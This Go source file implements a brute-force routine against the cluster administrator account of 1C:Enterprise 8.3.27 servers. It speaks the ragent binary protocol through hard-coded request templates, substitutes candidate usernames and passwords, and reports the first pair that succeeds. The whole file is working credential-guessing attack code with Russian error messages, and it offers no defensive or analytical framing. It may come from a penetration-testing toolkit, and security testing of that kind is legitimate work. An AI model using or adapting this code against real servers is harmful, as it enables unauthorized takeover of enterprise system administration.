package agent

import (
	"bytes"
	"context"
	"fmt"
	"strings"
	"time"
)

type ClusterBruteForceConfig struct {
	ClusterName string
	Usernames   []string
	Passwords   []string
	Delay       time.Duration
	MaxAttempts int
	OnAttempt   func(attempt int, username string)
}

type ClusterCredentialResult struct {
	ClusterName string
	Username    string
	Password    string
	Attempts    int
	Found       bool
}

var clusterWindowsAuthTemplate = []byte{
	0x41, 0x95, 0x59, 0x96, 0xa9, 0x2c, 0x97, 0xd2, 0x81, 0x46, 0xa2, 0x76, 0x9c, 0x51, 0xd4, 0x11, 0xcc, 0x44,
	0x8d, 0x94, 0x1d, 0x81, 0x85, 0x95, 0x77, 0xaa, 0xcd, 0x73, 0xfc, 0x2a, 0x6c, 0x43, 0xb7, 0x38, 0x58, 0xc7,
	0x72, 0xe3, 0xa0, 0xbf, 0x8a, 0x84, 0x84, 0x81, 0xcb, 0x23, 0x95, 0x32, 0x59, 0x13, 0xae, 0x94, 0x4f,
	0xdf, 0x44, 0x92, 0xc1, 0xc9, 0x1f, 0x15, 0xa9, 0x28, 0x48, 0xc2, 0x95, 0xc6, 0xa2, 0xb9, 0x88, 0xb9, 0x25,
	0xc9, 0x4e, 0x8e, 0xca, 0xf7, 0xe8, 0x5f, 0xa8, 0x97, 0xdd, 0x20, 0xa1, 0xcb, 0x53, 0x81, 0xa1, 0xcb, 0x53,
	0x9a, 0x09, 0x23, 0x57, 0x49, 0x4e, 0x41, 0x55, 0x54, 0x48, 0x23, 0x20, 0x20, 0x66, 0x53, 0xb2, 0xa6,
}

var clusterCredentialTemplate = []byte{
	0x41, 0x95, 0x59, 0x96, 0xa9, 0x2c, 0x97, 0xd2, 0x81, 0x46, 0xa2, 0x76, 0x9c, 0x51, 0xd4, 0x11, 0xcc, 0x44,
	0x8d, 0x96, 0x1d, 0x81, 0x85, 0x95, 0x77, 0xaa, 0xcd, 0x73, 0xfc, 0x2a, 0x6c, 0x43, 0xb7, 0x38, 0x58, 0xc7,
	0x72, 0xe3, 0xa0, 0xbf, 0x8a, 0x84, 0x84, 0x81, 0xcb, 0x23, 0x95, 0x32, 0x59, 0x13, 0xae, 0x94, 0x4f,
	0xdf, 0x44, 0x92, 0xc1, 0xc9, 0x1f, 0x15, 0xa9, 0x28, 0x48, 0xc2, 0x95, 0xc6, 0xa2, 0xb9, 0x88, 0xb9, 0x25,
	0xc9, 0x4e, 0x8e, 0xca, 0xf7, 0xe8, 0x5f, 0xa8, 0x97, 0xdd, 0x20, 0xa1, 0xcb, 0x53, 0x9a, 0x05,
	0x41, 0x64, 0x6d, 0x69, 0x6e, 0xa1, 0xcb, 0x53, 0x9a, 0x10,
	0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66,
	0x20, 0x20, 0x66, 0x53, 0xb2, 0xa6,
}

func (client Client) BruteForceClusterAdmin(ctx context.Context, endpoint, username, password, workstation string, config ClusterBruteForceConfig, timeout time.Duration) (ClusterCredentialResult, error) {
	result := ClusterCredentialResult{ClusterName: config.ClusterName}
	if len(config.Usernames) == 0 || len(config.Passwords) == 0 {
		return result, fmt.Errorf("списки логинов и паролей не должны быть пустыми")
	}
	if config.MaxAttempts == 0 {
		config.MaxAttempts = 1000
	}
	if config.MaxAttempts < 0 {
		return result, fmt.Errorf("некорректный лимит попыток")
	}
	inspection, err := client.Authenticate(ctx, endpoint, username, password, workstation, timeout)
	if err != nil {
		return result, err
	}
	if !strings.HasPrefix(inspection.PlatformVersion, "8.3.27.") {
		return result, fmt.Errorf("перебор пока поддерживается только для 1С 8.3.27, обнаружена версия %s", inspection.PlatformVersion)
	}
	var cluster *ClusterInfo
	for index := range inspection.Clusters {
		if inspection.Clusters[index].Name == config.ClusterName {
			cluster = &inspection.Clusters[index]
			break
		}
	}
	if cluster == nil {
		return result, fmt.Errorf("кластер %q не найден", config.ClusterName)
	}
	if cluster.AdminStatus == ClusterAdminAbsent {
		return result, fmt.Errorf("администратор кластера отсутствует, перебор не требуется")
	}
	if cluster.AdminStatus != ClusterAdminPresent {
		return result, fmt.Errorf("статус администратора кластера не определён")
	}
	client.PlatformVersion = inspection.PlatformVersion

	session, authResult, err := client.openSession(ctx, endpoint, username, password, workstation, timeout)
	if err != nil {
		return result, err
	}
	if session == nil {
		return result, fmt.Errorf("аутентификация ragent не выполнена: %s", authResult.Detail)
	}
	defer session.connection.Close()
	if _, _, _, err := checkAdminAccessWithFlag(session.connection, session.reader, session.authenticationFrame, client.PlatformVersion, 0x1d); err != nil {
		return result, fmt.Errorf("подготовка аутентификации кластера: %w", err)
	}

	windowsAuthRequest := withSessionID(clusterWindowsAuthTemplate, session.id)
	windowsAuthRequest = withClusterID(windowsAuthRequest, cluster.ID, 0, client.PlatformVersion)
	_ = session.connection.SetDeadline(time.Now().Add(timeout))
	if _, err := session.connection.Write(windowsAuthRequest); err != nil {
		return result, fmt.Errorf("подготовка проверки учётных данных: %w", err)
	}
	if _, err := session.reader.readFrame(maxProtocolFrame); err != nil {
		return result, fmt.Errorf("ответ подготовки проверки учётных данных: %w", err)
	}

	requestID := byte(0x95)
	for _, candidateUsername := range config.Usernames {
		for _, candidatePassword := range config.Passwords {
			if result.Attempts >= config.MaxAttempts {
				return result, nil
			}
			request, err := buildClusterCredentialRequest(session.id, cluster.ID, candidateUsername, candidatePassword, requestID)
			if err != nil {
				return result, err
			}
			requestID++
			result.Attempts++
			if config.OnAttempt != nil {
				config.OnAttempt(result.Attempts, candidateUsername)
			}
			_ = session.connection.SetDeadline(time.Now().Add(timeout))
			if _, err := session.connection.Write(request); err != nil {
				return result, fmt.Errorf("отправка учётных данных: %w", err)
			}
			response, err := session.reader.readFrame(maxProtocolFrame)
			if err != nil {
				return result, fmt.Errorf("ответ проверки учётных данных: %w", err)
			}
			if responseDetail(response) == "" {
				result.Username = candidateUsername
				result.Password = candidatePassword
				result.Found = true
				return result, nil
			}
			if !isAccessFailure(firstTextRun(response)) {
				return result, fmt.Errorf("проверка учётных данных отклонена: %s", responseDetail(response))
			}
			if config.Delay > 0 {
				select {
				case <-ctx.Done():
					return result, ctx.Err()
				case <-time.After(config.Delay):
				}
			}
		}
	}
	return result, nil
}

func buildClusterCredentialRequest(sessionID string, clusterID []byte, username, password string, requestID byte) ([]byte, error) {
	if len(username) == 0 || len(username) > 255 || len(password) > 255 {
		return nil, fmt.Errorf("логин и пароль должны занимать от 1 до 255 байт")
	}
	request := withSessionID(clusterCredentialTemplate, sessionID)
	request = withClusterID(request, clusterID, 0, "8.3.27")
	request[19] = requestID
	oldUsername := append([]byte{0x9a, 0x05}, []byte("Admin")...)
	newUsername := append([]byte{0x9a, byte(len(username))}, []byte(username)...)
	request = bytes.Replace(request, oldUsername, newUsername, 1)
	oldPassword := append([]byte{0x9a, 0x10}, []byte("0123456789abcdef")...)
	newPassword := append([]byte{0x9a, byte(len(password))}, []byte(password)...)
	request = bytes.Replace(request, oldPassword, newPassword, 1)
	return request, nil
}
